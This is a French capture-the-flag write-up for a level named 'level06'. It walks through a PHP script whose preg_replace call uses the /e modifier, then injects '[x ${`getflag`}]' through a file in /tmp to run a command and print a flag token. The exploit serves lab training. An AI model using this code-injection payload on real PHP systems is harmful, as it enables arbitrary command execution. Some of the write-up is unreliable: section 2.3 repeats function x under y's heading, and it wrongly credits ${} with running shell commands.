## Level 06: 
  
1. 
    Suite au login, on remarque 2 ficheris présents: ```level06```et ```level06.php```.  
    On essaye d'éxecuter le binaire `level06`:
    ```bash
    PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
    ```  
    Nous comprenons alors qu'il va falloir examiner et utiliser le fichier `level06.php`.  
    Nous examinons le contenu du fichier php :
    ```bash
    cat level06.php
    ```
    Output:
    ```php
    #!/usr/bin/php
    <?php
    function y($m) { 
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m; 
    }

    function x($y, $z) { 
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
        return $a;
    }

    $r = x($argv[1], $argv[2]);
    print $r;
    ?>
    ```
2. Analyse du script ```level06.php```:  
Le script ```level06.php``` définit deux fonctions, y et x, qui manipulent des chaînes de caractères via des remplacements avec des expressions régulières et exécutent des actions sur des fichiers.

    2.1 Prise d'arguments en ligne de commande:  
    Le script prend 2 arguments ```$argv[1]``` et ```$argv[2]``` en ligne de commande :
    ```php
    $r = x($argv[1], $argv[2]); 
    ```

    2.2  La fonction x:  
    ```php
    function x($y, $z) { 
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a);
    return $a;
    }
    ```
    Cette fonction fait plusieurs choses :
    - Chargement de fichier
        ```php
        $a = file_get_contents($y);
        ```  
        Cette ligne permet de charger le fichier, dont le chemin est fourni par `$y`, dans la variable `$a` en utilisant `file_get_contents($y)`
    - 1er remplacement:
        ```php
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        ```  
        Cette ligne recherche des motifs dans `$a` correspondant à `[x ...]` où `...` peut être n'importe quel texte. La partie capturée après `[x` (désignée par `(.*)`) est passée en argument à la fonction `y`. Puis, Le contenu `[x ...]`est remplacé par le résultat de la fonction `y(...)`.
    - 2eme et 3eme remplacement:
        ```php
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        ```  
        Ces lignes permettent de remplacer tous les `[` par des `(` ainsi que tous les `]` par des `)`.  

    2.3  La fonction y:  
    ```php
    function x($y, $z) { 
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a);
    return $a;
    }
    ```
    Cette fonction prend une chaîne de caractères m en entrée, applique 2 remplacements avec des expressions régulières, et retourne la chaîne modifiée :
    - Elle remplace tous les . (points) par la chaîne x (un espace, un "x", et un autre espace).
    - Elle remplace tous les @ (arobases) par la chaîne y (un espace suivi d'un "y").  

3. Analyse de la faille :  
    Dans la fonction x, une ligne nous intéresse:
    ```php
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    ```
    La fonction preg_replace en PHP permet de rechercher des motifs dans une chaîne de caractères et de les remplacer par une autre chaîne. Elle prend trois arguments :
    - Le premier argument : L'expression régulière `"/(\[x (.*)\])/e" `
    - Le deuxième argument : La chaîne de remplacement `"y(\"\\2\")"`
    - Le troisième argument : La chaîne d'entrée `$a`.
    
    La particularité ici réside dans l'usage du modificateur /e, qui est notre faille:
    
    - Le modificateur /e signifie que PHP évaluera la chaîne de remplacement comme du code PHP.
    - Cela permet d’exécuter du code PHP arbitraire dans la chaîne de remplacement.
    
    Ainsi, pour exploiter la faille, il suffit que la chaîne d'entrée `$a` soit `[x ${getflag}]` pour que le script éxecute la commande shell `${getflag}`. ( En PHP la syntaxe `${}` est utilisée pour l’exécution de commandes shell.)  

4. Exploitation de la faille:  
    Pour exploiter cette faille, nous allons créer un fichier temporaire `flag06` dans `/tmp/` contenant ```[x ${`getflag`}]```:
    ```bash
    echo '[x ${`getflag`}]' > /tmp/flag06
    ```  
    et nous allons ensuite éxecuter le binaire `level06` avec le fichier `/tmp/flag06` argument.  
    Output:
    ```bash
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
     in /home/user/level06/level06.php(4) : regexp code on line 1
    ```
